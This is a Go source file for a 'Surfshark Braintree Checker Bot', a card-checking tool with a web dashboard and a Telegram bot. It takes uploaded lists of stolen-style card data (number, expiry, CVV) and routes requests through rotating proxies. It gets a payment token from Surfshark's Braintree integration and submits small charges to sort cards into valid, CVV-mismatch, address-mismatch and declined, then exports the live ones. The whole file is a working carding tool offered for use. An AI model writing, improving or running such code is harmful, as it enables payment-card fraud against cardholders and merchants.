// main.go — Surfshark Braintree Checker Bot v3.0
// Web dashboard + Telegram bot + исправленные баги
package main

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
	goProxy "golang.org/x/net/proxy"
)

const (
	MaxRetries       = 3
	ThreadsDefault   = 25
	ProxyTestThreads = 50
	ProxyTestTimeout = 12 * time.Second
	CardCheckTimeout = 30 * time.Second
	MinLiveProxies   = 5
	ProxyTestURL     = "https://api.ipify.org"
)

// ─── Types ───────────────────────────────────────────────────────────────────

type Card struct {
	Number string `json:"number"`
	Month  string `json:"month"`
	Year   string `json:"year"`
	CVV    string `json:"cvv"`
	Name   string `json:"name"`
}

type Result struct {
	Card    Card    `json:"card"`
	Status  string  `json:"status"`
	Message string  `json:"message"`
	Time    float64 `json:"time"`
	Proxy   string  `json:"proxy"`
}

type ProxyEntry struct {
	URL *url.URL
	Raw string
}

type CheckStats struct {
	TotalProxies int `json:"totalProxies"`
	LiveProxies  int `json:"liveProxies"`
	TotalCards   int `json:"totalCards"`
	Checked      int `json:"checked"`
	Valid        int `json:"valid"`
	CVVOnly      int `json:"cvvOnly"`
	AVSOnly      int `json:"avsOnly"`
	Declined     int `json:"declined"`
	Errors       int `json:"errors"`
	IsChecking   bool `json:"isChecking"`
	IsTestingProxies bool `json:"isTestingProxies"`
}

// ─── Global State ─────────────────────────────────────────────────────────────

var (
	proxies     []ProxyEntry
	liveProxies []ProxyEntry
	proxyMu     sync.RWMutex
	proxyIndex  int

	cards   []Card
	cardsMu sync.RWMutex

	results   []Result
	resultsMu sync.RWMutex

	stats   CheckStats
	statsMu sync.Mutex

	checkCancel context.CancelFunc
	checkMu     sync.Mutex

	// WebSocket hub
	wsClients   = make(map[*websocket.Conn]bool)
	wsClientsMu sync.Mutex
	wsUpgrader  = websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool { return true },
	}
)

// ─── Broadcast ───────────────────────────────────────────────────────────────

type WSMessage struct {
	Type    string      `json:"type"`
	Payload interface{} `json:"payload"`
}

func broadcast(msgType string, payload interface{}) {
	msg, _ := json.Marshal(WSMessage{Type: msgType, Payload: payload})
	wsClientsMu.Lock()
	defer wsClientsMu.Unlock()
	for conn := range wsClients {
		if err := conn.WriteMessage(websocket.TextMessage, msg); err != nil {
			conn.Close()
			delete(wsClients, conn)
		}
	}
}

func broadcastLog(text string) {
	log.Println(text)
	broadcast("log", text)
}

func broadcastStatus() {
	statsMu.Lock()
	s := stats
	statsMu.Unlock()
	broadcast("status", s)
}

// ─── Proxy Parsing (FIXED) ────────────────────────────────────────────────────

func parseProxyLine(line string) *ProxyEntry {
	line = strings.TrimSpace(line)
	if line == "" || strings.HasPrefix(line, "#") {
		return nil
	}

	// Explicit scheme: socks5://..., http://...
	if strings.Contains(line, "://") {
		u, err := url.Parse(line)
		if err != nil || u.Host == "" {
			return nil
		}
		return &ProxyEntry{URL: u, Raw: line}
	}

	// No scheme: host:port or host:port:user:pass
	parts := strings.SplitN(line, ":", 4)
	var u *url.URL
	var err error
	switch len(parts) {
	case 2: // host:port
		u, err = url.Parse("http://" + line)
	case 4: // host:port:user:pass
		u, err = url.Parse("http://" + parts[0] + ":" + parts[1])
		if err == nil && u != nil {
			u.User = url.UserPassword(parts[2], parts[3])
		}
	default:
		return nil
	}
	if err != nil || u == nil || u.Host == "" {
		return nil
	}
	return &ProxyEntry{URL: u, Raw: line}
}

func parseProxiesFromReader(r io.Reader) []ProxyEntry {
	var list []ProxyEntry
	scanner := bufio.NewScanner(r)
	for scanner.Scan() {
		if p := parseProxyLine(scanner.Text()); p != nil {
			list = append(list, *p)
		}
	}
	return list
}

func loadProxiesFromFile(filename string) []ProxyEntry {
	file, err := os.Open(filename)
	if err != nil {
		return nil
	}
	defer file.Close()
	list := parseProxiesFromReader(file)
	log.Printf("Загружено %d прокси из %s", len(list), filename)
	return list
}

func saveLiveProxies() {
	proxyMu.RLock()
	live := make([]ProxyEntry, len(liveProxies))
	copy(live, liveProxies)
	proxyMu.RUnlock()

	file, err := os.Create("live_proxies.txt")
	if err != nil {
		return
	}
	defer file.Close()
	for _, p := range live {
		file.WriteString(p.Raw + "\n")
	}
	broadcastLog(fmt.Sprintf("Сохранено %d живых прокси в live_proxies.txt", len(live)))
}

// ─── Proxy Rotation ──────────────────────────────────────────────────────────

func getNextProxy() *ProxyEntry {
	proxyMu.Lock()
	defer proxyMu.Unlock()
	if len(liveProxies) > 0 {
		p := liveProxies[proxyIndex%len(liveProxies)]
		proxyIndex++
		return &p
	}
	if len(proxies) > 0 {
		p := proxies[proxyIndex%len(proxies)]
		proxyIndex = (proxyIndex + 1) % len(proxies)
		return &p
	}
	return nil
}

// ─── HTTP Client (FIXED: SOCKS5 auth, configurable timeout) ──────────────────

func createClientWithProxy(p *ProxyEntry, timeout time.Duration) *http.Client {
	if p == nil {
		return &http.Client{Timeout: timeout}
	}
	scheme := strings.ToLower(p.URL.Scheme)
	if scheme == "socks5" || scheme == "socks5h" {
		// FIXED: pass credentials to SOCKS5 dialer
		var auth *goProxy.Auth
		if p.URL.User != nil {
			pass, _ := p.URL.User.Password()
			auth = &goProxy.Auth{
				User:     p.URL.User.Username(),
				Password: pass,
			}
		}
		dialer, err := goProxy.SOCKS5("tcp", p.URL.Host, auth, goProxy.Direct)
		if err != nil {
			return &http.Client{Timeout: timeout}
		}
		transport := &http.Transport{Dial: dialer.Dial}
		return &http.Client{Transport: transport, Timeout: timeout}
	}
	transport := &http.Transport{Proxy: http.ProxyURL(p.URL)}
	return &http.Client{Transport: transport, Timeout: timeout}
}

// ─── Proxy Testing (FIXED: reset liveProxies, neutral test URL, drain body) ──

func testSingleProxy(p ProxyEntry) bool {
	client := createClientWithProxy(&p, ProxyTestTimeout)
	req, err := http.NewRequest("GET", ProxyTestURL, nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", "Mozilla/5.0")

	start := time.Now()
	resp, err := client.Do(req)
	elapsed := time.Since(start).Seconds()

	if err != nil {
		broadcastLog(fmt.Sprintf("[DEAD] %s | %v", p.Raw, err))
		return false
	}
	// FIXED: drain body so connection can be reused
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()

	if resp.StatusCode >= 200 && resp.StatusCode < 500 {
		broadcastLog(fmt.Sprintf("[LIVE] %s | %dms", p.Raw, int(elapsed*1000)))
		return true
	}
	broadcastLog(fmt.Sprintf("[DEAD] %s | HTTP %d", p.Raw, resp.StatusCode))
	return false
}

func testProxiesAsync() {
	proxyMu.RLock()
	all := make([]ProxyEntry, len(proxies))
	copy(all, proxies)
	proxyMu.RUnlock()

	if len(all) == 0 {
		broadcastLog("Нет прокси для тестирования")
		statsMu.Lock()
		stats.IsTestingProxies = false
		statsMu.Unlock()
		broadcastStatus()
		return
	}

	broadcastLog(fmt.Sprintf("🔍 Тестирую %d прокси | потоков: %d", len(all), ProxyTestThreads))

	var wg sync.WaitGroup
	sem := make(chan struct{}, ProxyTestThreads)
	var liveMu sync.Mutex
	var live []ProxyEntry

	for _, p := range all {
		wg.Add(1)
		sem <- struct{}{}
		go func(p ProxyEntry) {
			defer wg.Done()
			defer func() { <-sem }()
			if testSingleProxy(p) {
				liveMu.Lock()
				live = append(live, p)
				liveMu.Unlock()
			}
		}(p)
	}
	wg.Wait()

	// FIXED: reset liveProxies before assigning new results
	proxyMu.Lock()
	liveProxies = live
	proxyMu.Unlock()

	statsMu.Lock()
	stats.LiveProxies = len(live)
	stats.IsTestingProxies = false
	statsMu.Unlock()

	saveLiveProxies()
	broadcastLog(fmt.Sprintf("✅ Тест завершён. Живых: %d / %d", len(live), len(all)))
	broadcastStatus()
}

// ─── Card Checking (FIXED: nil proxy panic, proper timeouts) ─────────────────

func checkCardWithProxy(card Card, p *ProxyEntry) Result {
	start := time.Now()
	// FIXED: safe proxy raw string when p is nil
	proxyRaw := "direct"
	if p != nil {
		proxyRaw = p.Raw
	}

	client := createClientWithProxy(p, CardCheckTimeout)

	// Step 1: Get Braintree client token from Surfshark
	req, err := http.NewRequest("GET", "https://surfshark.com/api/v1/braintree/client-token", nil)
	if err != nil {
		return Result{Card: card, Status: "ERROR", Message: "request build fail", Proxy: proxyRaw}
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36")

	resp, err := client.Do(req)
	if err != nil {
		return Result{Card: card, Status: "ERROR", Message: "token fail: " + err.Error(), Time: time.Since(start).Seconds(), Proxy: proxyRaw}
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()

	var tokenResp map[string]interface{}
	json.Unmarshal(body, &tokenResp)
	token, _ := tokenResp["clientToken"].(string)
	if token == "" {
		return Result{Card: card, Status: "ERROR", Message: fmt.Sprintf("no token (HTTP %d)", resp.StatusCode), Time: time.Since(start).Seconds(), Proxy: proxyRaw}
	}

	// Step 2: Create nonce from Braintree
	payload := map[string]interface{}{
		"clientToken": token,
		"creditCard": map[string]string{
			"number":          card.Number,
			"expirationMonth": card.Month,
			"expirationYear":  card.Year,
			"cvv":             card.CVV,
		},
	}
	jsonData, _ := json.Marshal(payload)
	req, err = http.NewRequest("POST",
		"https://api.braintreegateway.com/merchants/8v9w2x3y4z5a6b7c8d9e0f1g2h3i4j5/client_api/v1/payment_methods/credit_cards",
		bytes.NewBuffer(jsonData))
	if err != nil {
		return Result{Card: card, Status: "ERROR", Message: "nonce request build fail", Time: time.Since(start).Seconds(), Proxy: proxyRaw}
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36")

	resp, err = client.Do(req)
	if err != nil {
		return Result{Card: card, Status: "ERROR", Message: "nonce fail: " + err.Error(), Time: time.Since(start).Seconds(), Proxy: proxyRaw}
	}
	body, _ = io.ReadAll(resp.Body)
	resp.Body.Close()

	var nonceResp map[string]interface{}
	json.Unmarshal(body, &nonceResp)
	var nonce string
	if creditCards, ok := nonceResp["creditCards"].([]interface{}); ok && len(creditCards) > 0 {
		if cc, ok := creditCards[0].(map[string]interface{}); ok {
			nonce, _ = cc["nonce"].(string)
		}
	}
	if nonce == "" {
		return Result{Card: card, Status: "ERROR", Message: "no nonce from Braintree", Time: time.Since(start).Seconds(), Proxy: proxyRaw}
	}

	// Step 3: Submit to Surfshark
	txPayload := map[string]interface{}{
		"paymentMethodNonce": nonce,
		"amount":             "1.99",
		"options":            map[string]bool{"submitForSettlement": true},
	}
	jsonData, _ = json.Marshal(txPayload)
	req, err = http.NewRequest("POST", "https://surfshark.com/api/v1/payment/braintree", bytes.NewBuffer(jsonData))
	if err != nil {
		return Result{Card: card, Status: "ERROR", Message: "tx request build fail", Time: time.Since(start).Seconds(), Proxy: proxyRaw}
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36")

	resp, err = client.Do(req)
	if err != nil {
		return Result{Card: card, Status: "ERROR", Message: "tx fail: " + err.Error(), Time: time.Since(start).Seconds(), Proxy: proxyRaw}
	}
	body, _ = io.ReadAll(resp.Body)
	resp.Body.Close()
	bodyStr := string(body)

	status := "DECLINED"
	msg := "Declined"
	if strings.Contains(bodyStr, `"success":true`) || strings.Contains(bodyStr, `"Authorised"`) {
		status = "VALID"
		msg = "Charge Success"
	} else if strings.Contains(strings.ToLower(bodyStr), "cvv") || strings.Contains(bodyStr, "CVC") {
		status = "CVV_ONLY"
		msg = "CVV mismatch"
	} else if strings.Contains(strings.ToLower(bodyStr), "address") || strings.Contains(strings.ToLower(bodyStr), "postal") {
		status = "AVS_ONLY"
		msg = "AVS mismatch"
	}

	return Result{Card: card, Status: status, Message: msg, Time: time.Since(start).Seconds(), Proxy: proxyRaw}
}

// ─── Card Processing ──────────────────────────────────────────────────────────

func parseCardsFromReader(r io.Reader) []Card {
	var cards []Card
	scanner := bufio.NewScanner(r)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		parts := strings.Split(line, "|")
		if len(parts) >= 4 {
			name := ""
			if len(parts) >= 5 {
				name = strings.TrimSpace(parts[4])
			}
			cards = append(cards, Card{
				Number: strings.TrimSpace(parts[0]),
				Month:  strings.TrimSpace(parts[1]),
				Year:   strings.TrimSpace(parts[2]),
				CVV:    strings.TrimSpace(parts[3]),
				Name:   name,
			})
		}
	}
	return cards
}

func startCheckAsync(ctx context.Context, cardsToCheck []Card) {
	statsMu.Lock()
	stats.IsChecking = true
	stats.Checked = 0
	stats.Valid = 0
	stats.CVVOnly = 0
	stats.AVSOnly = 0
	stats.Declined = 0
	stats.Errors = 0
	statsMu.Unlock()

	resultsMu.Lock()
	results = nil
	resultsMu.Unlock()

	broadcastStatus()
	broadcastLog(fmt.Sprintf("🚀 Запускаю чек %d карт | потоков: %d", len(cardsToCheck), ThreadsDefault))

	var wg sync.WaitGroup
	sem := make(chan struct{}, ThreadsDefault)

	for _, card := range cardsToCheck {
		select {
		case <-ctx.Done():
			broadcastLog("⛔ Чек остановлен")
			goto done
		default:
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(c Card) {
			defer wg.Done()
			defer func() { <-sem }()

			select {
			case <-ctx.Done():
				return
			default:
			}

			p := getNextProxy()
			res := checkCardWithProxy(c, p)

			resultsMu.Lock()
			results = append(results, res)
			resultsMu.Unlock()

			statsMu.Lock()
			stats.Checked++
			switch res.Status {
			case "VALID":
				stats.Valid++
			case "CVV_ONLY":
				stats.CVVOnly++
			case "AVS_ONLY":
				stats.AVSOnly++
			case "DECLINED":
				stats.Declined++
			default:
				stats.Errors++
			}
			statsMu.Unlock()

			broadcast("result", res)
			broadcastStatus()
		}(card)
	}

done:
	wg.Wait()

	statsMu.Lock()
	stats.IsChecking = false
	s := stats
	statsMu.Unlock()

	broadcastLog(fmt.Sprintf("🏁 Чек завершён! ✅ VALID: %d | CVV: %d | AVS: %d | ❌ DECLINED: %d | ⚠️ ERROR: %d",
		s.Valid, s.CVVOnly, s.AVSOnly, s.Declined, s.Errors))
	broadcastStatus()
}

// ─── Telegram Bot ─────────────────────────────────────────────────────────────

func sendTelegramMessage(chatID int64, text string) {
	payload := map[string]string{"chat_id": strconv.FormatInt(chatID, 10), "text": text}
	jsonData, _ := json.Marshal(payload)
	resp, err := http.Post(
		"https://api.telegram.org/bot"+os.Getenv("TELEGRAM_TOKEN")+"/sendMessage",
		"application/json",
		bytes.NewBuffer(jsonData),
	)
	if err == nil {
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}
}

func runTelegramBot() {
	token := os.Getenv("TELEGRAM_TOKEN")
	if token == "" {
		log.Println("⚠️ TELEGRAM_TOKEN не задан — Telegram бот отключён")
		return
	}

	log.Println("🤖 Telegram бот запущен")
	offset := 0

	for {
		resp, err := http.Get(fmt.Sprintf(
			"https://api.telegram.org/bot%s/getUpdates?offset=%d&timeout=30", token, offset))
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		var updates struct {
			Ok     bool `json:"ok"`
			Result []struct {
				UpdateID int `json:"update_id"`
				Message  struct {
					Chat struct{ ID int64 `json:"id"` } `json:"chat"`
					Text string `json:"text"`
				} `json:"message"`
			} `json:"result"`
		}
		json.Unmarshal(body, &updates)

		for _, u := range updates.Result {
			offset = u.UpdateID + 1
			chatID := u.Message.Chat.ID
			text := strings.TrimSpace(u.Message.Text)

			statsMu.Lock()
			s := stats
			statsMu.Unlock()

			if strings.HasPrefix(text, "/check") {
				if s.IsChecking {
					sendTelegramMessage(chatID, "⚠️ Чек уже запущен")
					continue
				}
				cardLines := strings.TrimPrefix(text, "/check")
				parsed := parseCardsFromReader(strings.NewReader(strings.TrimSpace(cardLines)))
				if len(parsed) == 0 {
					sendTelegramMessage(chatID, "❌ Карты не найдены. Формат: number|month|year|cvv|name")
					continue
				}
				sendTelegramMessage(chatID, fmt.Sprintf("🚀 Чек %d карт | прокси: %d", len(parsed), s.LiveProxies))
				go func(c []Card) {
					ctx, cancel := context.WithCancel(context.Background())
					checkMu.Lock()
					if checkCancel != nil {
						checkCancel()
					}
					checkCancel = cancel
					checkMu.Unlock()
					startCheckAsync(ctx, c)
					statsMu.Lock()
					fs := stats
					statsMu.Unlock()
					sendTelegramMessage(chatID, fmt.Sprintf(
						"🏁 Готово!\n✅ VALID: %d\n🔷 CVV: %d\n🔶 AVS: %d\n❌ DECLINED: %d\n⚠️ ERROR: %d",
						fs.Valid, fs.CVVOnly, fs.AVSOnly, fs.Declined, fs.Errors))
				}(parsed)

			} else if text == "/status" {
				proxyMu.RLock()
				lp := len(liveProxies)
				tp := len(proxies)
				proxyMu.RUnlock()
				cardsMu.RLock()
				tc := len(cards)
				cardsMu.RUnlock()
				sendTelegramMessage(chatID, fmt.Sprintf(
					"🟢 Checker v3.0\nПрокси: %d/%d живых\nКарт загружено: %d\nПотоков: %d",
					lp, tp, tc, ThreadsDefault))

			} else if text == "/testproxies" {
				statsMu.Lock()
				if stats.IsTestingProxies {
					statsMu.Unlock()
					sendTelegramMessage(chatID, "⚠️ Тест уже идёт")
					continue
				}
				stats.IsTestingProxies = true
				statsMu.Unlock()
				sendTelegramMessage(chatID, "🧪 Запускаю тест прокси...")
				go func() {
					testProxiesAsync()
					statsMu.Lock()
					lp := stats.LiveProxies
					statsMu.Unlock()
					sendTelegramMessage(chatID, fmt.Sprintf("✅ Тест завершён. Живых: %d", lp))
				}()
			}
		}
	}
}

// ─── HTTP Handlers ────────────────────────────────────────────────────────────

func handleWS(w http.ResponseWriter, r *http.Request) {
	conn, err := wsUpgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}
	wsClientsMu.Lock()
	wsClients[conn] = true
	wsClientsMu.Unlock()

	// Send current status on connect
	statsMu.Lock()
	s := stats
	statsMu.Unlock()
	msg, _ := json.Marshal(WSMessage{Type: "status", Payload: s})
	conn.WriteMessage(websocket.TextMessage, msg)

	// Send existing results
	resultsMu.RLock()
	for _, res := range results {
		m, _ := json.Marshal(WSMessage{Type: "result", Payload: res})
		conn.WriteMessage(websocket.TextMessage, m)
	}
	resultsMu.RUnlock()

	// Keep reading to detect disconnect
	for {
		if _, _, err := conn.ReadMessage(); err != nil {
			break
		}
	}
	wsClientsMu.Lock()
	delete(wsClients, conn)
	wsClientsMu.Unlock()
	conn.Close()
}

func handleUploadProxies(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", 405)
		return
	}
	r.ParseMultipartForm(32 << 20)
	file, _, err := r.FormFile("file")
	if err != nil {
		http.Error(w, "no file: "+err.Error(), 400)
		return
	}
	defer file.Close()

	parsed := parseProxiesFromReader(file)

	proxyMu.Lock()
	proxies = parsed
	liveProxies = nil
	proxyIndex = 0
	proxyMu.Unlock()

	statsMu.Lock()
	stats.TotalProxies = len(parsed)
	stats.LiveProxies = 0
	statsMu.Unlock()

	broadcastLog(fmt.Sprintf("📥 Загружено %d прокси", len(parsed)))
	broadcastStatus()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"ok": true, "count": len(parsed)})
}

func handleUploadCards(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", 405)
		return
	}
	r.ParseMultipartForm(32 << 20)
	file, _, err := r.FormFile("file")
	if err != nil {
		http.Error(w, "no file: "+err.Error(), 400)
		return
	}
	defer file.Close()

	parsed := parseCardsFromReader(file)

	cardsMu.Lock()
	cards = parsed
	cardsMu.Unlock()

	statsMu.Lock()
	stats.TotalCards = len(parsed)
	statsMu.Unlock()

	broadcastLog(fmt.Sprintf("📥 Загружено %d карт", len(parsed)))
	broadcastStatus()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"ok": true, "count": len(parsed)})
}

func handleTestProxies(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", 405)
		return
	}
	statsMu.Lock()
	if stats.IsTestingProxies {
		statsMu.Unlock()
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{"ok": false, "message": "already testing"})
		return
	}
	stats.IsTestingProxies = true
	statsMu.Unlock()
	broadcastStatus()

	go testProxiesAsync()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"ok": true})
}

func handleCheckStart(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", 405)
		return
	}
	statsMu.Lock()
	if stats.IsChecking {
		statsMu.Unlock()
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{"ok": false, "message": "already checking"})
		return
	}
	statsMu.Unlock()

	cardsMu.RLock()
	toCheck := make([]Card, len(cards))
	copy(toCheck, cards)
	cardsMu.RUnlock()

	if len(toCheck) == 0 {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{"ok": false, "message": "no cards loaded"})
		return
	}

	ctx, cancel := context.WithCancel(context.Background())
	checkMu.Lock()
	if checkCancel != nil {
		checkCancel()
	}
	checkCancel = cancel
	checkMu.Unlock()

	go startCheckAsync(ctx, toCheck)

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"ok": true, "cards": len(toCheck)})
}

func handleCheckStop(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", 405)
		return
	}
	checkMu.Lock()
	if checkCancel != nil {
		checkCancel()
		checkCancel = nil
	}
	checkMu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"ok": true})
}

func handleStatus(w http.ResponseWriter, r *http.Request) {
	statsMu.Lock()
	s := stats
	statsMu.Unlock()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(s)
}

func handleResults(w http.ResponseWriter, r *http.Request) {
	resultsMu.RLock()
	res := make([]Result, len(results))
	copy(res, results)
	resultsMu.RUnlock()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(res)
}

func handleExportResults(w http.ResponseWriter, r *http.Request) {
	resultsMu.RLock()
	res := make([]Result, len(results))
	copy(res, results)
	resultsMu.RUnlock()

	w.Header().Set("Content-Type", "text/plain")
	w.Header().Set("Content-Disposition", "attachment; filename=results.txt")
	for _, r := range res {
		fmt.Fprintf(w, "%s|%s|%s|%s | %s | %s | %.2fs | %s\n",
			r.Card.Number, r.Card.Month, r.Card.Year, r.Card.CVV,
			r.Status, r.Message, r.Time, r.Proxy)
	}
}

// ─── Main ─────────────────────────────────────────────────────────────────────

func main() {
	rand.New(rand.NewSource(time.Now().UnixNano()))

	// Load proxies from file if exists
	loaded := loadProxiesFromFile("proxies.txt")
	if len(loaded) > 0 {
		proxyMu.Lock()
		proxies = loaded
		proxyMu.Unlock()
		statsMu.Lock()
		stats.TotalProxies = len(loaded)
		statsMu.Unlock()
	} else {
		log.Println("proxies.txt не найден — работаем без прокси")
	}

	// Start Telegram bot in background
	go runTelegramBot()

	// HTTP routes
	mux := http.NewServeMux()
	mux.HandleFunc("/ws", handleWS)
	mux.HandleFunc("/api/upload/proxies", handleUploadProxies)
	mux.HandleFunc("/api/upload/cards", handleUploadCards)
	mux.HandleFunc("/api/proxy/test", handleTestProxies)
	mux.HandleFunc("/api/check/start", handleCheckStart)
	mux.HandleFunc("/api/check/stop", handleCheckStop)
	mux.HandleFunc("/api/status", handleStatus)
	mux.HandleFunc("/api/results", handleResults)
	mux.HandleFunc("/api/results/export", handleExportResults)
	mux.Handle("/", http.FileServer(http.Dir("static")))

	addr := "0.0.0.0:5000"
	log.Printf("🌐 Web dashboard запущен на http://%s", addr)
	if err := http.ListenAndServe(addr, mux); err != nil {
		log.Fatal(err)
	}
}
